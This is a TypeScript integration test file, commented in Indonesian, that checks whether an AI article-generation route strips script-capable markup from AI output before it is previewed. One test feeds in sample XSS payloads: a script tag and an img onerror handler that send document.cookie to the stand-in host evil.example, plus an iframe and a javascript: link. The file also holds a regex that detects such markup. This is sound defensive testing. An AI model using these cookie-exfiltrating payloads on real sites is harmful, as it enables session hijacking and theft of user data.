// Task 5 — Integration test tambahan (kode SUDAH diperbaiki; HARUS LOLOS).
//
// Melengkapi Testing Strategy → Integration Tests di design.md:
//   I-A. Alur generate → pratinjau dengan keluaran AI berbahaya → field `html`
//        tidak mengandung markup yang bisa mengeksekusi skrip.
//   I-B. Alur generate → pratinjau dengan keluaran aman → konten utuh & draft
//        dapat disimpan (field `content` identik dengan jalur asli, sehingga
//        yang tersimpan tidak berubah perilaku).
//   I-C. Komentar pada ai-studio-client.tsx selaras dengan perilaku aktual
//        (sanitasi di server). Diverifikasi via asersi ringan pada sumber —
//        merender komponen berat tidak praktis di lingkungan node.
//
// _Requirements: 2.1, 2.2, 2.3, 2.4, 3.1, 3.2, 3.3, 3.4_

import { readFileSync } from "node:fs";
import { resolve } from "node:path";

import { beforeEach, describe, expect, it, vi } from "vitest";

import {
  buildArticleRequest,
  chatCompletionMock,
  mockAiHtml,
  requireApiUserMock,
  resetAiArticleMocks,
  resolveAiConfigWithModelMock,
  validArticleBody,
} from "@/test/helpers/ai-article-mocks";

import { htmlToLexicalState } from "@/lib/v2-admin/html-to-lexical";
import { ensureCta } from "@/lib/v2-admin/lexical";

vi.mock("@/lib/ai/client", () => ({
  chatCompletion: chatCompletionMock,
}));

vi.mock("@/lib/v2-admin/ai-runtime", () => ({
  resolveAiConfigWithModel: resolveAiConfigWithModelMock,
}));

vi.mock("@/lib/v2-auth/api-guard", async (importOriginal) => {
  const actual =
    await importOriginal<typeof import("@/lib/v2-auth/api-guard")>();
  return { ...actual, requireApiUser: requireApiUserMock };
});

const { POST } = await import("../route");

// --- Predikat markup yang bisa mengeksekusi skrip ---------------------------

const containsExecutableMarkup = (html: string): boolean =>
  /<\s*(script|iframe|object|embed|svg|form)\b/i.test(html) ||
  /\son\w+\s*=/i.test(html) ||
  /(href|src)\s*=\s*['"]?\s*(?:javascript|data|vbscript):/i.test(html);

const stripCodeFence = (raw: string): string => {
  const match = raw.match(/```(?:html)?\s*([\s\S]*?)```/i);
  return (match ? match[1] : raw).trim();
};

const expectedContentFor = (rawAiOutput: string): unknown =>
  ensureCta(htmlToLexicalState(stripCodeFence(rawAiOutput)));

const runHandler = async (
  rawAiOutput: string,
): Promise<{ status: number; data: { html: string; content: unknown } }> => {
  mockAiHtml(rawAiOutput);
  const response = await POST(buildArticleRequest(validArticleBody()));
  const data = (await response.json()) as { html: string; content: unknown };
  return { status: response.status, data };
};

describe("Integration — alur generate → pratinjau AI Studio (Task 5)", () => {
  beforeEach(() => {
    resetAiArticleMocks();
  });

  // --- I-A — Keluaran AI berbahaya → pratinjau tak bisa eksekusi skrip ------
  it("I-A: keluaran AI berbahaya → field `html` tanpa markup yang bisa eksekusi skrip", async () => {
    // Simulasikan provider AI membalas dengan payload XSS realistis di dalam
    // pembungkus code fence (seperti kebiasaan model membungkus ```html).
    const maliciousAiReply =
      "```html\n" +
      "<h1>Panduan Membeli Rumah</h1>" +
      "<p>Simak tips berikut.</p>" +
      "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>" +
      '<img src=x onerror="new Image().src=\'//evil.example/?\'+document.cookie">' +
      '<iframe src="https://evil.example/frame"></iframe>' +
      '<a href="javascript:alert(document.domain)">klik saya</a>' +
      "<p>Penutup artikel.</p>" +
      "\n```";

    const { status, data } = await runHandler(maliciousAiReply);

    expect(status).toBe(200);
    // Field `html` yang akan masuk ke dangerouslySetInnerHTML harus bebas dari
    // markup yang bisa mengeksekusi skrip.
    expect(containsExecutableMarkup(data.html)).toBe(false);
    expect(data.html).not.toMatch(/<\s*script/i);
    expect(data.html).not.toMatch(/<\s*iframe/i);
    expect(data.html).not.toMatch(/\son\w+\s*=/i);
    expect(data.html).not.toMatch(/javascript:/i);

    // Konten jinak sekitarnya tetap ada (tidak ada eksekusi, hanya dibersihkan).
    expect(data.html).toContain("Panduan Membeli Rumah");
    expect(data.html).toContain("Penutup artikel.");
  });

  // --- I-B — Keluaran AI aman → konten utuh & draft dapat disimpan ----------
  it("I-B: keluaran AI aman → konten utuh & `content` (draft) identik jalur asli", async () => {
    const safeAiReply =
      "```html\n" +
      "<h2>Keunggulan Hunian</h2>" +
      "<p>Lokasi strategis dekat pusat kota.</p>" +
      "<ul><li>Akses tol</li><li>Dekat sekolah</li></ul>" +
      '<p>Info lengkap di <a href="https://contoh.id">situs resmi</a>.</p>' +
      "\n```";

    const { status, data } = await runHandler(safeAiReply);

    expect(status).toBe(200);

    // Konten aman tampil utuh di pratinjau.
    expect(data.html).toContain("Keunggulan Hunian");
    expect(data.html).toContain("Lokasi strategis");
    expect(data.html).toContain("Akses tol");
    expect(data.html).toContain("Dekat sekolah");
    expect(data.html).toContain("https://contoh.id");
    expect(containsExecutableMarkup(data.html)).toBe(false);

    // Draft yang disimpan berasal dari field `content` — identik dengan jalur
    // asli, sehingga alur simpan tidak berubah perilaku.
    expect(data.content).toEqual(expectedContentFor(safeAiReply));
    // Idempoten: memanggil ensureCta lagi pada content tersimpan tak menambah
    // blok CTA (alur simpan berulang stabil).
    expect(ensureCta(data.content)).toEqual(data.content);
  });

  // --- I-C — Komentar klien selaras dengan perilaku aktual -----------------
  it("I-C: komentar ai-studio-client.tsx menyatakan sanitasi di server (bukan klaim htmlToLexicalState)", () => {
    const clientPath = resolve(
      process.cwd(),
      "src/app/v2-admin/ai-studio/ai-studio-client.tsx",
    );
    const source = readFileSync(clientPath, "utf8");

    // Cari blok dangerouslySetInnerHTML untuk field html pratinjau.
    expect(source).toMatch(/dangerouslySetInnerHTML/);

    // Komentar akurat: menyebut sanitasi server via sanitizeAiHtml().
    expect(source).toMatch(/sanitizeAiHtml\(\)/);
    expect(source).toMatch(/disanitasi di server/i);

    // Klaim keliru lama tidak boleh lagi menjelaskan field `html`:
    // "htmlToLexicalState membuang tag/atribut aktif".
    expect(source).not.toMatch(
      /htmlToLexicalState membuang tag\/atribut aktif/i,
    );
  });
});
